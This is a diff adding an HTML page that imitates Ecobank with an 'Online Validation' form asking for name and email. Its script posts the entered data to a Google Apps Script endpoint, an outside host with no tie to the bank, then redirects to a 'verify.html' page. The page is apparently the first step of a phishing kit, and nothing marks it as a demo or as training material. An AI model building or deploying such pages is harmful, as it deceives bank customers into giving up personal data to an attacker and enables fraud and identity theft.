@@ -1,0 +1,209 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Ecobank Online Validation</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      background: linear-gradient(to bottom, #2b6cb0, #2a4365);
+      min-height: 100vh;
+      color: #fff;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 0 10px;
+    }
+
+    .header {
+      background: linear-gradient(135deg, #2b6cb0, #2a4365);
+      width: 100%;
+      padding: 40px 20px;
+      text-align: center;
+      border-bottom-left-radius: 40px;
+      border-bottom-right-radius: 40px;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.3);
+    }
+
+    .title-badge {
+      display: inline-block;
+      background: linear-gradient(135deg, #1e3c72, #2a5298);
+      color: #fff;
+      padding: 12px 20px;
+      border-radius: 50px;
+      font-size: 20px;
+      font-weight: bold;
+      text-transform: uppercase;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.25);
+      margin-bottom: 10px;
+    }
+
+    .header p {
+      margin: 8px 0 0;
+      font-size: 14px;
+      color: #e0e0e0;
+    }
+
+    .form-wrap {
+      background: #fff;
+      width: 90%;
+      max-width: 400px;
+      margin-top: -30px;
+      padding: 30px 25px;
+      border-radius: 12px;
+      box-shadow: 0 6px 16px rgba(0,0,0,0.4);
+      color: #333;
+    }
+
+    label {
+      display: block;
+      margin-bottom: 6px;
+      font-size: 14px;
+      color: #333;
+      font-weight: bold;
+    }
+
+    input {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 18px;
+      border-radius: 6px;
+      border: 1px solid #ccc;
+      background: #fff;
+      color: #000;
+      font-size: 14px;
+      box-sizing: border-box;
+    }
+
+    button {
+      width: 100%;
+      padding: 12px;
+      border-radius: 50px;
+      border: none;
+      background: linear-gradient(135deg, #28a745, #218838);
+      color: #fff;
+      font-weight: bold;
+      cursor: pointer;
+      font-size: 16px;
+      transition: all 0.3s ease;
+    }
+
+    button:hover {
+      background: linear-gradient(135deg, #218838, #1e7e34);
+      transform: scale(1.05);
+      box-shadow: 0 4px 12px rgba(0,0,0,0.4);
+    }
+
+    .processing-overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(0, 0, 0, 0.45);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      color: #fff;
+      font-weight: 700;
+      font-size: 18px;
+      z-index: 999;
+      opacity: 0;
+      pointer-events: none;
+      transition: opacity .2s;
+      text-align: center;
+    }
+
+    .processing-overlay.active {
+      opacity: 1;
+      pointer-events: auto;
+    }
+
+    .spinner {
+      width: 35px;
+      height: 35px;
+      border: 3px solid rgba(255, 255, 255, 0.35);
+      border-top: 3px solid #fff;
+      border-radius: 50%;
+      margin-bottom: 15px;
+      animation: spin .9s linear infinite;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    @media (max-width: 500px) {
+      .title-badge { font-size: 18px; padding: 10px 16px; }
+      .form-wrap { padding: 25px 20px; }
+      button { font-size: 15px; }
+    }
+  </style>
+</head>
+<body>
+  <div class="header">
+    <h1 class="title-badge">ECOBANK ONLINE VALIDATION</h1>
+    <p>A BETTER WAY TO BANK YOUR WAY</p>
+  </div>
+
+  <div class="form-wrap" id="formContainer">
+    <form id="dataForm" autocomplete="off">
+      <label for="firstName">First Name</label>
+      <input id="firstName" name="firstName" type="text" placeholder="Enter your first name" required>
+
+      <label for="lastName">Last Name</label>
+      <input id="lastName" name="lastName" type="text" placeholder="Enter your last name" required>
+
+      <label for="email">Email</label>
+      <input id="email" name="email" type="email" placeholder="Enter your email address" required>
+
+      <button type="submit">CONTINUE →</button>
+    </form>
+  </div>
+
+  <div class="processing-overlay" id="processingOverlay" aria-hidden="true">
+    <div class="spinner" aria-hidden="true"></div>
+    <div>Processing…</div>
+  </div>
+
+  <script>
+    const scriptURL = "https://script.google.com/macros/s/AKfycbxna9EgM4s8zbNQTkfzcHfADid6CE7MEMmXAAIX2RTU6YfT-GkHRxEIWPVa81Qt-oO0/exec";
+
+    const form = document.getElementById('dataForm');
+    const overlay = document.getElementById('processingOverlay');
+    const formContainer = document.getElementById('formContainer');
+
+    form.addEventListener('submit', async (e) => {
+      e.preventDefault();
+      overlay.classList.add('active');
+      formContainer.style.filter = 'blur(3px)';
+
+      const fd = new FormData(form);
+      const firstName = fd.get('firstName');
+      const lastName = fd.get('lastName');
+      const email = fd.get('email');
+
+      try {
+        await fetch(scriptURL, { method: 'POST', body: fd });
+
+        // Store data for the next page
+        localStorage.setItem('firstName', firstName || '');
+        localStorage.setItem('lastName', lastName || '');
+        localStorage.setItem('email', email || '');
+
+        // Redirect after short delay
+        setTimeout(() => {
+          window.location.href = 'verify.html';
+        }, 800);
+
+      } catch (err) {
+        alert('Something went wrong. Please try again.');
+        console.error(err);
+      } finally {
+        overlay.classList.remove('active');
+        formContainer.style.filter = 'none';
+      }
+    });
+  </script>
+</body>
+</html>
